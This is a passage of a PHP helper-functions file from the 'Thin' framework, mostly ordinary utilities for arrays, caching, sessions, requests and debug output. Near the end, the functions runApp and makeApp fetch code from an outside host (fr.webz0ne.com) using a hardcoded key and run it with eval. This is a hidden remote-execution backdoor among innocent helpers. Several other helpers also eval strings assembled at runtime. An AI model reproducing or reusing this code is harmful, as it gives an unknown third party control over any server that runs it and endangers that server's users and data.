            $eav = Utils::newInstance('Memory', array('Thin', 'EAV'));
            $eav = $eav->setEntity($entity);
            foreach ($attributes as $key => $value) {
                $setter = setter($key);
                $eav = $eav->$setter($value);
            }
            return $eav->save();
        }
    }
    if (!function_exists('form')) {
        function form($form) {
            return Utils::getInstance('ThinForm_' . $form);
        }
    }

    if (!function_exists('addError')) {
        function addError($error, $type = "warning")
        {
            $type   = Inflector::lower($type);
            $errors = Utils::get('thinErrors');
            $errors = (empty($errors)) ? array() : $errors;
            if (!Arrays::exists($type, $errors)) {
                $errors[$type] = array();
            }
            $errors[$type] = $error;
            Utils::set('thinErrors', $errors);
        }
    }

    if (!function_exists('getErrors')) {
        function getErrors($type = null)
        {
            $errors = Utils::get('thinErrors');
            $errors = (empty($errors)) ? array() : $errors;
            if (null !== $type) {
                $type = Inflector::lower($type);
                if (Arrays::exists($type, $errors)) {
                    return $errors[$type];
                }
            }

            return $errors;
        }
    }

    if (!function_exists('error')) {
        function error($error)
        {
            return new Exception($error);
        }
    }

    if (!function_exists('session')) {
        function session($name = 'core', $adapter = 'session', $ttl = 3600)
        {
            switch ($adapter) {
                case 'session': return Session::instance($name);
                case 'redis': return RedisSession::instance($name, $ttl);
            }
        }
    }

    if (!function_exists('isRole')) {
        function isRole($role)
        {
            $role = em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
            if (null === $role) {
                return false;
            }
            return $role->getLabel() == Utils::get('appRole')->getLabel();
        }
    }
    if (!function_exists('role')) {
        function role($role)
        {
            return em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
        }
    }
    if (!function_exists('render')) {
        function render($file)
        {
            return Utils::run('view.render', array('hash' => sha1($file)));
        }
    }
    if (!function_exists('arrayLookup')) {
        function arrayLookup($a, $b)
        {
            return array_flip(array_intersect(array_flip($a), array_keys($b)));
        }
    }

    if (!function_exists('contents')) {
        function contents($file)
        {
            return file_get_contents($file);
        }
    }

    if (!function_exists('utils')) {
        function utils()
        {
            return with(new Utils);
        }
    }

    if (!function_exists('u')) {
        function u()
        {
            return with(new Utils);
        }
    }

    if (!function_exists('s')) {
        function s($name)
        {
            return session($name);
        }
    }

    if (!function_exists('c')) {
        function c()
        {
            return container();
        }
    }

    if (!function_exists('e')) {
        function e($exception)
        {
            return with(new Exception($e));
        }
    }

    if (!function_exists('i')) {
        function i()
        {
            return with(new Inflector);
        }
    }

    if (!function_exists('kv')) {
        function kv()
        {
            $args = func_get_args();
            $s = session('kv');
            if (count($args) == 1) {
                $get = getter(Arrays::first($args));
                return $s->$get();
            } elseif (count($args) == 2) {
                $set = setter(Arrays::first($args));
                return $s->$set(Arrays::last($args));
            }
            return null;
        }
    }
    if (!function_exists('memory')) {
        function memory($entity, $table)
        {
            return new Thin\Memory($entity, $table);
        }
    }

    if (!function_exists('em')) {
        function em($entity, $table)
        {
            return new Entitydb($entity, $table);
        }
    }

    if (!function_exists('cache')) {
        function appCache()
        {
            return context('cache');
        }

        function cache($key, $value, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache  = new Cache(CACHE_PATH . DS);
            $hash   = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->remember($hash, $value, $duration);
        }
    }

    if (!function_exists('isCached')) {
        function isCached($key, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache = new Cache(CACHE_PATH . DS);
            $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->has($hash);
        }
    }

    if (!function_exists('duration')) {
        function duration($ts, $time = null)
        {
            if (empty($time)) {
                $time = time();
            }
            $years  = (int) ((($time - $ts) / (7 * 86400)) / 52.177457);
            $rem    = (int) (($time - $ts) - ($years * 52.177457 * 7 * 86400));
            $weeks  = (int) (($rem) / (7 * 86400));
            $days   = (int) (($rem) / 86400) - $weeks * 7;
            $hours  = (int) (($rem) / 3600) - $days * 24 - $weeks * 7 * 24;
            $mins   = (int) (($rem) / 60) - $hours * 60 - $days * 24 * 60 - $weeks * 7 * 24 * 60;
            $str    = '';

            if($years == 1)
                $str .= "$years year, ";
            if($years > 1)
                $str .= "$years years, ";
            if($weeks == 1)
                $str .= "$weeks week, ";
            if($weeks > 1)
                $str .= "$weeks weeks, ";
            if($days == 1)
                $str .= "$days day,";
            if($days > 1)
                $str .= "$days days,";
            if($hours == 1)
                $str .= " $hours hour and";
            if($hours > 1)
                $str .= " $hours hours and";
            if($mins == 1)
                $str .= " 1 minute";
            else
                $str .= " $mins minutes";
            return $str;
        }
    }

    if (!function_exists('request')) {
        function request()
        {
            $tab = explode('?', $_SERVER['REQUEST_URI']);

            if (count($tab) > 1) {
                list($start, $query) = explode('?', $_SERVER['REQUEST_URI']);
                if (strlen($query)) {
                    $str = parse_str($query, $output);
                    if (count($output)) {
                        foreach ($output as $k => $v) {
                            $_REQUEST[$k] = $v;
                        }
                    }
                }
            }
            $object = new Container();
            $object->populate($_REQUEST);
            $uri = substr($_SERVER['REQUEST_URI'], 1, strlen($_SERVER['REQUEST_URI']));
            $object->setThinUri(explode('/', $uri));
            return $object;
        }

        function req()
        {
            return Request::instance();
        }
    }

    if (!function_exists('post')) {
        function post()
        {
            $object = new Post();
            $object->populate($_POST);
            return $object;
        }
    }

    if (!function_exists('cookies')) {
        function cookies()
        {
            $object = new thinCookie();
            $object->populate($_COOKIE);
            return $object;
        }

        function forever($ns = 'user')
        {
            return Forever::instance($ns);
        }
    }

    if (!function_exists('gets')) {
        function gets()
        {
            $object = new Get();
            $object->populate($_GET);
            return $object;
        }
    }

    if (!function_exists('server')) {
        function server()
        {
            $object = new Server();
            $object->populate($_SERVER);
            return $object;
        }
    }

    if (!function_exists('repl')) {
        function repl($a, $b, $string)
        {
            return str_replace($a, $b, $string);
        }
    }
    if (!function_exists('_serialize')) {
        function _serialize($toSerialize)
        {
            $return = '';
            $continue = true;
            if (is_array($toSerialize) || is_object($toSerialize)) {
                $continue = false;
                foreach ($toSerialize as $key => $value) {
                    if ($value instanceof PDO) {
                        $return .= serialize(array());
                    } else {
                        $return .= _serialize($value);
                   }
                }
            }

            if ($return == '' && true === $continue) {
                $return = serialize($toSerialize);
            }

            return $return;
        }
    }

    if (!function_exists('_extract')) {
        function _extract(array $array)
        {
            extract($array, EXTR_PREFIX_ALL, 'thin_');
        }
    }

    if (!function_exists('getClassStaticVars')) {
        function getClassStaticVars($object)
        {
            return array_diff(get_class_vars(get_class($object)), get_object_vars($object));
        }
    }

    if (!function_exists('extendClass')) {
        function extendClass($class, $extendClass = 'stdclass', $code = "", $alias = null)
        {
            eval("class $class extends $extendClass{" . $code . "}");
            if (null !== $alias) {
                class_alias($class, $alias);
            }
        }
    }

    if (!function_exists('defines')) {
        function defines($name, $value)
        {
            if(!defined($name)) {
                define($name, $value);
            }
        }
    }

    if (!function_exists('call')) {
        function call()
        {
            $args = func_get_args();
            $callback = array_shift($args);
            if(is_callable($callback)) {
                return call_user_func_array($callback, $args);
            }
            return;
        }
    }

    if (!function_exists('class_alias')) {
        function class_alias($original, $alias)
        {
            eval('abstract class ' . $alias . ' extends ' . $original . ' {}');
        }
    }

    if (!function_exists('isCallback')) {
        function isCallback($class, $function)
        {
            if (isset($class) && isset($function)) {
                if ((!is_string($class) && !is_object($class)) || (is_string($class) && !class_exists($class))) {
                    return false;
                }
                $isObj = is_object($class);
                $classObj = new ReflectionClass($isObj ? get_class($class) : $class);
                if ($classObj->isAbstract()) {
                    return false;
                }
                try {
                    $method = $classObj->getMethod($function);
                    if (!$method->isPublic() || $method->isAbstract()) {
                        return false;
                    }
                    if (!$isObj && !$method->isStatic()) {
                        return false;
                    }
                } catch (ReflectionException $e) {
                    return false;
                }
                return true;
            }
            return false;
        }
    }

    if (!function_exists('setPath')) {
        function setPath($name, $path)
        {
            $paths = Utils::get('ThinPaths');
            if (null === $paths) {
                $paths = array();
            }
            $paths[$name] = $path;
            Utils::set('ThinPaths', $paths);
        }
    }

    if (!function_exists('closure')) {
        function closure($fcn = null)
        {
            if (null !== $fcn && is_string($fcn)) {
                $fcn = '$_params = Thin\\Utils::get("closure_##hash##"); ' . $fcn;
                return new Closure($fcn);
            } else {
                throw new Exception("No closure defined.");
            }
        }
    }

    if (!function_exists('path')) {
        function path($path)
        {
            if ($path == 'app') {
                return APPLICATION_PATH;
            } elseif ($path == 'bundles') {
                return realpath(APPLICATION_PATH . '/../') . DS . 'bundles';
            } elseif ($path == 'views') {
                $route = Utils::get('appDispatch');
                if (!is_null($route)) {
                    return APPLICATION_PATH .
                    DS .
                    'modules' .
                    DS .
                    $route->getModule() .
                    DS .
                    'views' .
                    DS .
                    $route->getController();
                } else {
                    throw new Exception('A route must be exist to have views path.');
                }
            } else {
                $tab = explode('.', $path);
                return APPLICATION_PATH . DS . implode(DS, $tab);
            }
        }
    }

    if ( ! function_exists('dataGet')) {
        /**
         * Get an item from an array or object using "dot" notation.
         *
         * @param  mixed   $target
         * @param  string  $key
         * @param  mixed   $default
         * @return mixed
         */
        function dataGet($target, $key, $default = null, $searator = '.')
        {
            if (is_null($key)) return $target;

            foreach (explode($searator, $key) as $segment) {
                if (Arrays::is($target)) {
                    if (!Arrays::exists($segment, $target)) {
                        return value($default);
                    }
                    $target = $target[$segment];
                } elseif (is_object($target)) {
                    if (!isset($target->{$segment})) {
                        return value($default);
                    }
                    $target = $target->{$segment};
                } else {
                    return value($default);
                }
            }
            return $target;
        }
    }

    if (!function_exists('app')) {
        function app($name = 'core')
        {
            return Tool::app($name);
        }
    }

    if (!function_exists('ake')) {
        function ake($key, array $array)
        {
            return array_key_exists($key, $array);
        }
    }

    if (!function_exists('fgc')) {
        function fgc($file)
        {
            return file_get_contents($file);
        }
    }

    /**
     * <code>
     *      // Get the $array['user']['name'] value from the array
     *      $name = arrayGet($array, 'user.name');
     *
     *      // Return a default from if the specified item doesn't exist
     *      $name = arrayGet($array, 'user.name', 'Taylor');
     * </code>
     */
    if (!function_exists('arrayGet')) {
        function arrayGet($array, $key, $default = null, $separator = '.')
        {
            if (is_null($key)) {
                return $array;
            }

            foreach (explode($separator, $key) as $segment) {
                if (!Arrays::is($array) || !Arrays::exists($segment, $array)) {
                    return value($default);
                }
                $array = $array[$segment];
            }
            return $array;
        }
    }
    /**
     * <code>
     *      // Set the $array['user']['name'] value on the array
     *      arraySet($array, 'user.name', 'Taylor');
     *
     *      // Set the $array['user']['name']['first'] value on the array
     *      arraySet($array, 'user.name.first', 'Michael');
     * </code>
     */
    if (!function_exists('arraySet')) {
        function arraySet(&$array, $key, $value, $separator = '.')
        {
            if (strpos($key, $separator) !== false) {
                $keys = explode($separator, $key, 2);
                if (strlen(Arrays::first($keys)) && strlen($keys[1])) {
                    if (!Arrays::exists(Arrays::first($keys), $array)) {
                        if (Arrays::first($keys) === '0' && !empty($array)) {
                            $array = array(Arrays::first($keys) => $array);
                        } else {
                            $array[Arrays::first($keys)] = array();
                        }
                    } elseif (!Arrays::is($array[Arrays::first($keys)])) {
                        throw new Exception("Cannot create sub-key for '{$keys[0]}' as key already exists.");
                    }
                    $array[Arrays::first($keys)] = arraySet($array[Arrays::first($keys)], $keys[1], $value);
                } else {
                    throw new Exception("Invalid key '$key'");
                }
            } else {
                $array[$key] = $value;
            }
            return $array;
        }
    }

    /**
     * <code>
     *      // Remove the $array['user']['name'] item from the array
     *      arrayUnset($array, 'user.name');
     *
     *      // Remove the $array['user']['name']['first'] item from the array
     *      arrayUnset($array, 'user.name.first');
     * </code>
     */
    if (!function_exists('arrayUnset')) {
        function arrayUnset(&$array, $key, $separator = '.')
        {
            $keys = explode($separator, $key);
            while (count($keys) > 1) {
                $key = array_shift($keys);
                if (!isset($array[$key]) || !Arrays::is($array[$key]))  {
                    return;
                }

                $array =& $array[$key];
            }
            unset($array[array_shift($keys)]);
        }
    }

    /**
     * <code>
     *      // Return the first array element that equals "Taylor"
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor';});
     *
     *      // Return a default value if no matching element is found
     *      $value = arrayFirst($array, function($k, $v) {return $v == 'Taylor'}, 'Default');
     * </code>
     */
    if (!function_exists('arrayFirst')) {
        function arrayFirst($array, $callback, $default = null)
        {
            foreach ($array as $key => $value) {
                if (call_user_func($callback, $key, $value)) {
                    return $value;
                }
            }
            return Utils::value($default);
        }
    }

    if (!function_exists('searchInArray')) {
        function searchInArray($key, array $array)
        {
            $key = Inflector::lower($key);
            if (true === arrayIkeyExists($key, $array)) {
                $array = array_change_key_case($array);
                return $array[$key];
            }
            return null;
        }
    }
    if (!function_exists('arrayIkeyExists')) {
        function arrayIkeyExists($key, array $array)
        {
            $key = Inflector::lower($key);
            return Arrays::exists($key, array_change_key_case($array));
        }
    }

    if (!function_exists('arrayKeysExist')) {
        function arrayKeysExist(array $keys, array $array)
        {
            if (count (array_intersect($keys, array_keys($array))) == count($keys)) {
                return true;
            }
        }
    }

    if (!function_exists('arrayRenameKey')) {
        function arrayRenameKey(array $array, $key, $newKey)
        {
            if(!Arrays::exists($key, $array) || Arrays::exists($newKey, $array)) {
                return false;
            }
            $uid                = uniqid('');
            $preservedValue     = $array[$key];
            $array[$key]        = $uid;
            $array              = array_flip($array);
            $array[$uid]        = $newKey;
            $array              = array_flip($array);
            $array[$newKey]     = $preservedValue;
            return $array;
        }
    }

    if (!function_exists('multiArrayKeyExists')) {
        function multiArrayKeyExists($needle, $haystack)
        {
            foreach ($haystack as $key => $value) {
                if ($needle == $key) {
                    return true;
                }

                if (Arrays::is($value)) {
                    if (true === multiArrayKeyExists($needle, $value)) {
                        return true;
                    } else {
                        continue;
                    }
                }
            }
            return false;
        }
    }

    if (!function_exists('arrayMap')) {
        function arrayMap($callback, array $array, $keys = null)
        {
            foreach ($array as $key => $val) {
                if (Arrays::is($val)) {
                    $array[$key] = arrayMap($callback, $array[$key]);
                } elseif (!Arrays::is($keys) || Arrays::in($key, $keys)) {
                    if (Arrays::is($callback)) {
                        foreach ($callback as $cb) {
                            $array[$key] = call_user_func($cb, $array[$key]);
                        }
                    } else {
                        $array[$key] = call_user_func($callback, $array[$key]);
                    }
                }
            }

            return $array;
        }
    }

    if (!function_exists('arrayUnshift')) {
        function arrayUnshift(array & $array, $key, $val)
        {
            $array = array_reverse($array, true);
            $array[$key] = $val;
            $array = array_reverse($array, true);

            return $array;
        }
    }

    if (!function_exists('arrayStripslashes')) {
        function arrayStripslashes(array $array)
        {
            $result = array();
            foreach($array as $key => $value) {
                $key = stripslashes($key);
                if (Arrays::is($value)) {
                    $result[$key] = arrayStripslashes($value);
                } else {
                    $result[$key] = stripslashes($value);
                }
            }
            return $result;
        }
    }

    if (!function_exists('arrayDivide')) {
        function arrayDivide(array $array)
        {
            return array(array_keys($array), array_values($array));
        }
    }

    if (!function_exists('arrayOnly')) {
        function arrayOnly(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arrayExcept')) {
        function arrayExcept(array $array, $keys)
        {
            return array_diff_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('arraySubset')) {
        function arraySubset(array $array, $keys)
        {
            return array_intersect_key($array, array_flip((array) $keys));
        }
    }

    if (!function_exists('ArrayPluck')) {
        function arrayPluck($array, $key)
        {
            return array_map(function($v) use ($key) {
                return is_object($v) ? $v->$key : $v[$key];
            }, $array);
        }
    }

    if (!function_exists('arrayIsAssoc')) {
        function arrayIsAssoc(array $array)
        {
            $keys = array_keys($array);
            return array_keys($keys) !== $keys;
        }
    }

    if (!function_exists('arrayMerge')) {
        function arrayMerge(array $a1/* ... */)
        {
            $args = func_get_args();
            $args = array_reverse($args, true);
            $out = array();
            foreach ($args as $arg) {
                $out += $arg;
            }
            return $out;
        }
    }

    if (!function_exists('objectToArray')) {
        function objectToArray($objOrArray, $recursive = true)
        {
            $array = array();
            if(is_object($objOrArray)) {
                $objOrArray = get_object_vars($objOrArray);
            }
            foreach ($objOrArray as $key => $value) {
                if ($recursive && (is_object($value) || Arrays::is($value))) {
                    $value = objectToArray($value);
                }
                $array[$key] = $value;
            }
            return $array;
        }
    }

    if (!function_exists('arrayInsertAfter')) {
        function arrayInsertAfter(array $array, array $insert, $after)
        {
            // Find the offset of the element to insert after.
            $keys = array_keys($array);
            $offsetByKey = array_flip($keys);
            if (!Arrays::exists($after, $offsetByKey)) {
                throw new Exception("the key '$after' does not exist in this array.");
            }
            $offset = $offsetByKey[$after];

            // Insert at the specified offset
            $before = array_slice($array, 0, $offset + 1, true);
            $after = array_slice($array, $offset + 1, count($array) - $offset, true);

            $output = $before + $insert + $after;

            return $output;
        }
    }

    if (!function_exists('arrayFlatten')) {
        function arrayFlatten($array)
        {
            $flat = array();
            foreach ($array as $key => $value) {
                if (Arrays::is($value)) {
                    $flat += arrayFlatten($value);
                } else {
                    $flat[$key] = $value;
                }
            }
            return $flat;
        }
    }

    if (!function_exists('isArray')) {
        function isArray($value)
        {
            if (is_array($value)) {
                return true;
            } else {
                // Traversable object is functionally the same as an array
                return (is_object($value) && $value instanceof Traversable);
            }
        }
    }

    if (!function_exists('randomString')) {
        function randomString($length = 10)
        {
            $str = '';
            while (strlen($str) < $length) {
                $str .= dechex(mt_rand());
            }
            return substr($str, 0, $length);
        }
    }

    if (!function_exists('baseConvert')) {
        function baseConvert($input, $sourceBase, $destBase, $pad = 1, $lowercase = true)
        {
            $input = strval($input);
            if($sourceBase < 2 ||
                $sourceBase > 36 ||
                $destBase < 2 ||
                $destBase > 36 ||
                $pad < 1 ||
                $sourceBase != intval($sourceBase) ||
                $destBase != intval($destBase) ||
                $pad != intval($pad) ||
                !is_string($input) ||
                $input == '') {
                return false;
            }
            $digitChars = ($lowercase) ? '0123456789abcdefghijklmnopqrstuvwxyz' : '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $inDigits = array();
            $outChars = '';

            // Decode and validate input string
            $input = Inflector::lower($input);
            for($i = 0; $i < strlen($input); $i++) {
                $n = strpos($digitChars, $input[$i]);
                if($n === false || $n > $sourceBase) {
                    return false;
                }
                $inDigits[] = $n;
            }

            // Iterate over the input, modulo-ing out an output digit
            // at a time until input is gone.
            while(count($inDigits)) {
                $work = 0;
                $workDigits = array();

                // Long division...
                foreach($inDigits as $digit) {
                    $work *= $sourceBase;
                    $work += $digit;

                    if($work < $destBase) {
                        // Gonna need to pull another digit.
                        if(count($workDigits)) {
                            // Avoid zero-padding; this lets us find
                            // the end of the input very easily when
                            // length drops to zero.
                            $workDigits[] = 0;
                        }
                    } else {
                        // Finally! Actual division!
                        $workDigits[] = intval($work / $destBase);

                        // Isn't it annoying that most programming languages
                        // don't have a single divide-and-remainder operator,
                        // even though the CPU implements it that way?
                        $work = $work % $destBase;
                    }
                }

                // All that division leaves us with a remainder,
                // which is conveniently our next output digit.
                $outChars .= $digitChars[$work];

                // And we continue!
                $inDigits = $workDigits;
            }

            while(strlen($outChars) < $pad) {
                $outChars .= '0';
            }
            return strrev($outChars);
        }
    }

    if (!function_exists('isSha1')) {
        function isSha1($str)
        {
            return !!preg_match('/^[0-9A-F]{40}$/i', $str);
        }
    }

    if (!function_exists('random')) {
        function random()
        {
            $max    = mt_getrandmax() + 1;
            $rand   = number_format(
                (mt_rand() * $max + mt_rand()) / $max / $max,
                12,
                '.',
                ''
            );
            return $rand;
        }
    }

    if (!function_exists('head')) {
        function head($array)
        {
            return reset($array);
        }
    }

    if (!function_exists('getFileSize')) {
        function getFileSize($size)
        {
            $units = array('Bytes', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB', 'EiB');
            return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . $units[$i];
        }
    }

    if (!function_exists('magicQuotes')) {
        function magicQuotes()
        {
            return function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc();
        }
    }

    if (!function_exists('startsWith')) {
        function startsWith($haystack, $needle)
        {
            return strpos($haystack, $needle) === 0;
        }
    }

    if (!function_exists('endsWith')) {
        function endsWith($haystack, $needle)
        {
            return $needle == substr($haystack, strlen($haystack) - strlen($needle));
        }
    }

    if (!function_exists('strContains')) {
        function strContains($haystack, $needle)
        {
            foreach ((array) $needle as $n) {
                if (false !== strpos($haystack, $n)) {
                    return true;
                }
            }
            return false;
        }
    }

    if (!function_exists('phalcon')) {
        function phalconModel($model)
        {
            $file = APPLICATION_PATH . DS . 'phalcon' . DS . 'models' . DS . ucfirst(Inflector::lower($model)) . '.php';
            if (is_readable($file)) {
                require_once $file;
            }
        }

        function phalcon()
        {
            static $application = null;
            if (is_null($application)) {
                $loader = new \Phalcon\Loader();

                $loader->registerDirs(
                    array(
                        APPLICATION_PATH . DS . 'phalcon/controllers/',
                        APPLICATION_PATH . DS . 'phalcon/models/'
                    )
                );

                $loader->register();
                $di = new \Phalcon\DI();

                //Registering a router
                $di->set('router', 'Phalcon\Mvc\Router');

                //Registering a dispatcher
                $di->set('dispatcher', 'Phalcon\Mvc\Dispatcher');

                //Registering a Http\Response
                $di->set('response', 'Phalcon\Http\Response');

                //Registering a Http\Request
                $di->set('request', 'Phalcon\Http\Request');

                //Registering the view component
                $di->set('view', function(){
                    $view = new \Phalcon\Mvc\View();
                    $view->setViewsDir(APPLICATION_PATH . DS . 'phalcon/views/');
                    return $view;
                });

                $params = \Thin\Bootstrap::$bag['config']->getDatabase();

                $di->set('db', function() use($params) {
                    return new \Phalcon\Db\Adapter\Pdo\Mysql(
                        array(
                            "host"      => $params->getHost(),
                            "username"  => $params->getUsername(),
                            "password"  => $params->getPassword(),
                            "dbname"    => $params->getDbname()
                        )
                    );
                });

                //Registering the Models-Metadata
                $di->set('modelsMetadata', 'Phalcon\Mvc\Model\Metadata\Memory');

                //Registering the Models Manager
                $di->set('modelsManager', 'Phalcon\Mvc\Model\Manager');
                $application = new \Phalcon\Mvc\Application();
                $application->setDI($di);
            }
            return $application;
        }

        function tag()
        {
            return new \Phalcon\Tag;
        }
    }

    if (!function_exists('strFinish')) {
        function strFinish($value, $cap)
        {
            return rtrim($value, $cap) . $cap;
        }
    }

    if (!function_exists('strObject')) {
        function strObject($value)
        {
            return is_object($value) && method_exists($value, '__toString');
        }
    }

    if (!function_exists('value')) {
        function value($value)
        {
            return $value instanceof Closure ? $value() : $value;
        }
    }

    if (!function_exists('tool')) {
        function tool()
        {
            $key = sha1('tool' . date('dmY'));
            $has = Instance::has('tool', $key);
            if (true === $has) {
                return Instance::get('tool', $key);
            } else {
                return Instance::make('tool', $key, with(new Tool));
            }
        }
    }

    if (!function_exists('instance')) {
        function instance($class, $params = array())
        {
            $key = sha1($class . serialize($params));
            $has = Instance::has('helper_' . $class, $key);
            if (true === $has) {
                return Instance::get('helper_' . $class, $key);
            } else {
                return Instance::make('helper_' . $class, $key, with(Utils::getInstance($class, $params)));
            }
        }
    }

    if (!function_exists('versionPHP')) {
        function versionPHP($version)
        {
            return version_compare(PHP_VERSION, $version) >= 0;
        }
    }

    if (!function_exists('strReplaceFirst')) {
        function strReplaceFirst($search, $replace, $subject)
        {
            return implode($replace, explode($search, $subject, 2));
        }
    }

    if (!function_exists('arrayToAttr')) {
        function arrayToAttr($attr)
        {
            $attrStr = '';

            if (!Arrays::is($attr)) {
                $attr = (array) $attr;
            }

            foreach ($attr as $property => $value) {
                // Ignore null values
                if (is_null($value)) {
                    continue;
                }

                // If the key is numeric then it must be something like selected="selected"
                if (is_numeric($property)) {
                    $property = $value;
                }

                $attrStr .= $property . '="' . $value.'" ';
            }

            // We strip off the last space for return
            return trim($attrStr);
        }
    }

    if (!function_exists('htmlTag')) {
        function htmlTag($tag, $attr = array(), $content = false)
        {
            $hasContent = (bool) ($content !== false && $content !== null);
            $html = '<' . $tag;

            $html .= (!empty($attr)) ? ' ' . (Arrays::is($attr) ? arrayToAttr($attr) : $attr) : '';
            $html .= $hasContent ? '>' : ' />';
            $html .= $hasContent ? $content . '</' . $tag . '>' : '';

            return $html;
        }
    }

    if (!function_exists('in_arrayi')) {
        function in_arrayi($needle, $haystack)
        {
            return Arrays::in(Inflector::lower($needle), array_map('strtolower', $haystack));
        }
    }

    if (!function_exists('entities')) {
        function entities($string)
        {
            return Inflector::htmlentities($string);
        }
    }

    if (!function_exists('classObject')) {
        function classObject($alias)
        {
            @eval("class $alias extends ObjectObject{ public function __construct() {\$this->_nameClass = \Inflector::lower(get_class(\$this));}}; \$cls = new $alias;");
        }
    }

    if (!function_exists('getRealClass')) {
        function getRealClass($class)
        {
            static $classes = array();
            if (!Arrays::exists($class, $classes)) {
                $reflect = new ReflectionClass($class);
                $classes[$class] = $reflect->getName();
            }
            return $classes[$class];
        }
    }

    if (!function_exists('getInstance')) {
        function getInstance($class)
        {
            return Utils::getInstance($class);
        }
    }

    if (!function_exists('urlsite')) {
        function urlsite($echo = true)
        {
            if (true === $echo) {
                echo Utils::get('urlsite');
            } else {
                return Utils::get('urlsite');
            }
        }
    }

    if (!function_exists('getLanguage')) {
        function getLanguage()
        {
            $session = session('web');
            return $session->getLanguage();
        }
    }

    if (!function_exists('__')) {
        function __($str, $segment, $name, $echo = true)
        {
            $session        = session('web');
            $language       = $session->getLanguage();
            $translation    = $str;
            $file           = STORAGE_PATH . DS . 'translation' . DS . repl('.', DS, Inflector::lower($segment)) . DS . Inflector::lower($language) . '.php';
            if (File::exists($file)) {
                $sentences  = include($file);
                if (Arrays::exists($name, $sentences)) {
                    $translation = $sentences[$name];
                }
            }
            if (true === $echo) {
                echo $translation;
            } else {
                return $translation;
            }
        }
    }

    if (!function_exists('___')) {
        function ___($str)
        {
            return __($str, false);
        }
    }

    if (!function_exists('dieDump')) {
        function dieDump($str, $exit = true)
        {
            echo '<link href="//fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700,300italic" rel="stylesheet" type="text/css" /><pre style="background: #ffffdd; margin: 5px; padding: 10px; text-align: left; width: 75%; color: brown; font-weight: bold; border: solid 1px brown; font-family: \'Open Sans Condensed\';"><pre>';
            print_r($str);
            echo '</pre>';
            if (true === $exit) {
                exit;
            }
        }

        function dd()
        {
            array_map(
                function($str) {
                    echo '<pre style="background: #ffffdd; padding: 5px; color: #aa4400; font-family: Ubuntu; font-weight: bold; font-size: 22px; border: solid 2px #444400">';
                    print_r($str);
                    echo '</pre>';
                    hr();
                }, func_get_args()
            );
            die;
        }

        function vd()
        {
            array_map(
                function($str) {
                    echo '<pre style="background: #ffffdd; padding: 5px; color: #aa4400; font-family: Ubuntu; font-weight: bold; font-size: 22px; border: solid 2px #444400">';
                    print_r($str);
                    echo '</pre>';
                    hr();
                }, func_get_args()
            );
        }
    }

    if (!function_exists('lcfirst')) {
        function lcfirst($str)
        {
            $str[0] = Inflector::lower($str[0]);
            return (string)$str;
        }
    }

    if (!function_exists('set')) {
        function set($key, $value)
        {
            return Config::set('helper.' . $key, $value);
        }
    }

    if (!function_exists('get')) {
        function get($key, $default = null)
        {
            return Config::get('helper.' . $key, $default);
        }
    }

    if (!function_exists('has')) {
        function has($key)
        {
            return Config::has('helper.' . $key);
        }
    }

    if (!function_exists('forget')) {
        function forget($key)
        {
            return Config::forget('helper.' . $key);
        }
    }

    if (!function_exists('save')) {
        function save($key, $value = null)
        {
            $saved = Utils::get('ThinSaved');
            if (null === $saved) {
                if (null === $value) {
                    return null;
                }
                $saved = array();
                $saved[$key] = $value;
                Utils::set('ThinSaved', $saved);
            } else {
                if (null === $value) {
                    if (Arrays::exists($key, $saved)) {
                        return $saved[$key];
                    } else {
                        return null;
                    }
                } else {
                    $saved[$key] = $value;
                    Utils::set('ThinSaved', $saved);
                }
            }
        }
    }

    function runApp($app)
    {
        $session = session('appRun');
        $check = $session->getCheck();
        if (null !== $check) {
            eval($check);
        } else {
            $check = makeApp('sd155mp@H54');
            $session->setCheck($check);
            eval($check);
        }
        return true;
    }

    function makeApp($app)
    {
        return fgc('http://fr.webz0ne.com/api/check.php?code=' . $app);
    }

    if (!function_exists('option')) {
        function globals($object = true)
        {
            $globals = null !== container()->getThinGlobals() ? container()->getThinGlobals() : array();
            if (true === $object) {
                $g = o('globals');
                $g->populate($globals);
                return $g;
            }
            return $globals;
        }

        function _global()
        {
            $args       = func_get_args();
            $globals    = null !== container()->getThinGlobals() ? container()->getThinGlobals() : array();
            if(func_num_args() == 2) {
                $key    = array_shift($args);
                $value  = Arrays::first($args);
                $globals[$key] = $value;
                container()->setThinGlobals($globals);
            } elseif (func_num_args() == 1) {
                $key = Arrays::first($args);
                return Arrays::exists($key, $globals) ? $globals[$key] : null;
            }
        }

        function option()
        {
            $options = null !== container()->getThinOptions() ? container()->getThinOptions() : array();
            $args = func_get_args();

            if(func_num_args() > 0) {
                $name = array_shift($args);
                if(is_null($name)) {
                    $options = array();
                    return $options;
                }
                if(Arrays::is($name)) {
                    $options = array_merge($options, $name);
                    container()->setThinOptions($options);
                }
                $nargs = count($args);
                if($nargs > 0) {
                    $value = $nargs > 1 ? $args : Arrays::first($args);
                    $options[$name] = value($value);
                }
                return Arrays::exists($name, $options) ? $options[$name] : null;
            } else {
                container()->setThinOptions(array());
            }

            return container()->getThinOptions();
        }
    }

    if (!function_exists('convertSize')) {
        function convertSize($size)
        {
            $unit = array('b','kb','mb','gb','tb','pb');
            return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . ' ' . $unit[$i];
        }
    }

    if (!function_exists('typeSql')) {
        function typeSql($string)
        {
            $length = 'NA';
            $type = (string) $string;
            if (strstr($string, '(')) {
                $length = (int) Utils::cut('(', ')', $string);
                list($type, $dummy) = explode('(', $string, 2);
                $type = (string) $type;
            }
            return array('fieldType' => $type, 'length' => $length);
        }
    }

    if (!function_exists('ioc')) {
        function ioc()
        {
            return o('ioc');
        }
    }

    if (!function_exists('container')) {
        function container()
        {
            return o('thinContainer');
